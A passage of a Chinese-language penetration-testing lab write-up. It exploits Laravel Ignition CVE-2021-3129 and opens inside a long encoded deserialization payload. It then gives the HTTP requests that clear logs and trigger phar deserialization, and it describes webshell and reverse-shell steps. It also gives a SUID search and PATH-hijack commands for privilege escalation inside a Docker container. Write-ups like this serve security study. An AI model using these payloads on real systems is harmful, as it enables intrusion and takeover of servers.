class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=67=00=36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=73=00=62</span>=<span class="hljs-number">00=48=00=56</span>=<span class="hljs-number">00=74=00=61</span>=<span class="hljs-number">00=57=00=35</span>=<span class="hljs-number">00=68=00=64</span>=<span class="hljs-number">00=47=00=56</span>=<span class="hljs-number">00=63=00=51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=76=00=59</span>=<span class="hljs-number">00=57=00=52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=59=00=58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=30=00=61</span>=<span class="hljs-number">00=57=00=35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00=58=00=45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=79=00=62</span>=<span class="hljs-number">00=32=00=46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=59=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=64=00=45</span>=<span class="hljs-number">00=56=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=57=00=35</span>=<span class="hljs-number">00=30=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=45=00=77</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00=35=00=75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=30=00=61</span>=<span class="hljs-number">00=57=00=39</span>=<span class="hljs-number">00=75=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=74=00=50</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">72</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=35=00=58</span>=<span class="hljs-number">00=45=00=64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=56=00=79</span>=<span class="hljs-number">00=59=00=58</span>=<span class="hljs-number">00=52=00=76</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=72=00=52</span>=<span class="hljs-number">00=47=00=56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=61=00=57</span>=<span class="hljs-number">00=35=00=70</span>=<span class="hljs-number">00=64=00=47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=76=00=62</span>=<span class="hljs-number">00=69=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=70=00=37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=69=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00=67=00=42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=61=00=57</span>=<span class="hljs-number">00=63=00=69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=30=00=38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=55=00=36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=31=00=76</span>=<span class="hljs-number">00=59=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=63=00=52</span>=<span class="hljs-number">00=32=00=56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=68=00=64</span>=<span class="hljs-number">00=47=00=39</span>=<span class="hljs-number">00=79=00=58</span>=<span class="hljs-number">00=45=00=31</span>=<span class="hljs-number">00=76=00=59</span>=<span class="hljs-number">00=32=00=74</span>=<span class="hljs-number">00=44=00=62</span>=<span class="hljs-number">00=32=00=35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=61=00=57</span>=<span class="hljs-number">00=64=00=31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=46=00=30</span>=<span class="hljs-number">00=61=00=57</span>=<span class="hljs-number">00=39=00=75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=63=00=36</span>=<span class="hljs-number">00=49=00=67</span>=<span class="hljs-number">00=41=00=71</span>=<span class="hljs-number">00=41=00=47</span>=<span class="hljs-number">00=35=00=68</span>=<span class="hljs-number">00=62=00=57</span>=<span class="hljs-number">00=55=00=69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">33</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=69=00=59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=47=00=56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=79=00=49</span>=<span class="hljs-number">00=37=00=66</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=69=00=41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=41=00=59</span>=<span class="hljs-number">00=32=00=39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=53=00=49</span>=<span class="hljs-number">00=37=00=63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=69=00=50</span>=<span class="hljs-number">00=44=00=39</span>=<span class="hljs-number">00=77=00=61</span>=<span class="hljs-number">00=48=00=41</span>=<span class="hljs-number">00=67=00=63</span>=<span class="hljs-number">00=47=00=68</span>=<span class="hljs-number">00=77=00=61</span>=<span class="hljs-number">00=57=00=35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=62=00=79</span>=<span class="hljs-number">00=67=00=70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=79=00=42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=65=00=47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=79=00=41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>F=<span class="hljs-number">00=50=00=69</span>=<span class="hljs-number">00=49=00=37</span>=<span class="hljs-number">00=66=00=58</span>=<span class="hljs-number">00=31=00=39</span>=<span class="hljs-number">00=42=00=51</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=47</span>=<span class="hljs-number">00=52=00=31</span>=<span class="hljs-number">00=62=00=57</span>=<span class="hljs-number">00=31=00=35</span>=<span class="hljs-number">00=42=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">71</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=41=00=45</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=44=00=48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00=51=00=42</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=43=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=63=00=33</span>=<span class="hljs-number">00=51=00=75</span>=<span class="hljs-number">00=64=00=48</span>=<span class="hljs-number">00=68=00=30</span>=<span class="hljs-number">00=42=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">71</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=41=00=45</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=44=00=48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00=51=00=42</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=64=00=47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=64=00=48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=63=00=33</span>=<span class="hljs-number">00=54=00=67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">72</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>F=<span class="hljs-number">00=43=00=56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00=44=00=62</span>=<span class="hljs-number">00=37=00=76</span>=<span class="hljs-number">00=54=00=59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=47=00=48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=77=00=49</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=42</span>=<span class="hljs-number">00=48=00=51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=31=00=43</span>=<span class="hljs-number">00</span>a&quot;</span><br><span class="language-dns"> &#125;</span><br><span class="language-dns">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>清空log 文件中的打扰字符</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile">POST /_ignition/execute-solution HTTP/1.1<br><span class="hljs-section">Host:139.xxx:8080</span><br><span class="hljs-section">Content-Type: application/json</span><br><span class="hljs-section">Content-Length: 290</span><br><br>&#123;<br> <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br> <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br> <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br><span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br> &#125;<br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>进行反序列化</p>
+<p>这里需要指定一下绝对路径，但是如果没有ssh 的话 是查看不到的</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>139.xx:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>210<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;phar:///var/www/storage/logs/laravel.log/test.txt&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>直接使用工具进行利用</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">SecPros-Team&#x2F;laravel-CVE-2021-3129-EXP (github.com)</a></p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301182319076.png" srcset="/img/loading.gif" lazyload alt="image-20240301182319076"></p>
+<p>使用哥斯拉 连接</p>
+<p>但是哥斯拉版本需要控制一下，我选择直接放弃(消灾哥斯拉只用该版本4+,他需要2+)</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/crisprss/Laravel_CVE-2021-3129_EXP">crisprss&#x2F;Laravel_CVE-2021-3129_EXP (github.com)</a></p>
+</blockquote>
+<p>这个 需要修改一下自己的url</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301190931716.png" srcset="/img/loading.gif" lazyload alt="image-20240301190931716"></p>
+<blockquote>
+<p>vim 按G直接到最下面</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301191006593.png" srcset="/img/loading.gif" lazyload alt="image-20240301191006593"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301191024690.png" srcset="/img/loading.gif" lazyload alt="image-20240301191024690"></p>
+<p>尝试反弹shell </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301191349759.png" srcset="/img/loading.gif" lazyload alt="image-20240301191349759"></p>
+<p>但是失败</p>
+<p>尝试写webshell</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192306471.png" srcset="/img/loading.gif" lazyload alt="image-20240301192306471"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192250794.png" srcset="/img/loading.gif" lazyload alt="image-20240301192250794"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192406956.png" srcset="/img/loading.gif" lazyload alt="image-20240301192406956"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192538917.png" srcset="/img/loading.gif" lazyload alt="image-20240301192538917"></p>
+</li>
+<li><p>查询ip</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192613779.png" srcset="/img/loading.gif" lazyload alt="image-20240301192613779"></p>
+<p>没有ifconfig !?</p>
+</li>
+<li><p>docker 逃逸</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192648491.png" srcset="/img/loading.gif" lazyload alt="image-20240301192648491"></p>
+<p>发现存在于docker </p>
+<p>查看是否还有存在能用的指令</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301193408887.png" srcset="/img/loading.gif" lazyload alt="image-20240301193408887"></p>
+<p>尝试使用curl </p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">curl</span> <br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301193053927.png" srcset="/img/loading.gif" lazyload alt="image-20240301193053927"></p>
+<p>特权启动，使用挂载进行docker 逃逸</p>
+<p>发现当前权限太低就尝试提权</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301201054967.png" srcset="/img/loading.gif" lazyload alt="image-20240301201054967"></p>
+<p>可以尝试搜索高权限执行的文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301201550008.png" srcset="/img/loading.gif" lazyload alt="image-20240301201550008"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301201722044.png" srcset="/img/loading.gif" lazyload alt="image-20240301201722044"></p>
+<p>使用的是貌似是ps</p>
+<p>尝试使用环境变量劫持</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; ps<br><span class="hljs-built_in">chmod</span> 777 ps<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span> <br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">cd</span> /home/jobs<br>./shell<br></code></pre></td></tr></table></figure>
+
+<p>由于蚁剑的终端不是一个完整的终端，所以使用export 无效</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301210705300.png" srcset="/img/loading.gif" lazyload alt="image-20240301210705300"></p>
+<p>发现设置环境变量不行</p>
+<p>尝试上传msf </p>
+<p>发现不能上线，猜测是不出网的原因</p>
+<p>那么现在就只有redis 的ubuntu 是能使用的</p>
+<p>ubuntu?</p>
+<p>尝试反弹shelll 到ubuntu</p>
+<p>先写入一个shell 到文件</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095230936.png" srcset="/img/loading.gif" lazyload alt="image-20240302095230936"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095245238.png" srcset="/img/loading.gif" lazyload alt="image-20240302095245238"></p>
+<p>通过蚁剑 执行命令</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095328795.png" srcset="/img/loading.gif" lazyload alt="image-20240302095328795"></p>
+<p>这样不行换一种编码方式</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095806626.png" srcset="/img/loading.gif" lazyload alt="image-20240302095806626"></p>
+<p>执行</p>
+<p>上线</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095841528.png" srcset="/img/loading.gif" lazyload alt="image-20240302095841528"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; ps<br><span class="hljs-built_in">chmod</span> 777 ps<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span> <br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">cd</span> /home/jobs<br>./shell<br></code></pre></td></tr></table></figure>
+
